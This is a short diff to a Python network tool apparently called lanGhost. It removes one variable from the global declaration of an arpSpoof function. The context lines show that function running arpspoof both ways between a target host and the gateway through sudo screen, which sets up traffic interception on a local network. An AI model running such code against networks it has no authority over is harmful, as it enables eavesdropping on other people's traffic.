@@ -284,7 +284,7 @@ def subscriptionHandler(bot):
         time.sleep(20)
 
 def arpSpoof(target):
-    global iface_mac, gw_ip, gw_mac
+    global iface_mac, gw_ip
     print("[+] ARP Spoofing " + str(target[0]) + "...")
     os.system("sudo screen -S lanGhost-arp-" + target[0] + "-0 -m -d arpspoof -t " + target[0] + " " + gw_ip + " -i " + interface)
     os.system("sudo screen -S lanGhost-arp-" + target[0] + "-1 -m -d arpspoof -t " + gw_ip + " " + target[0] + " -i " + interface)
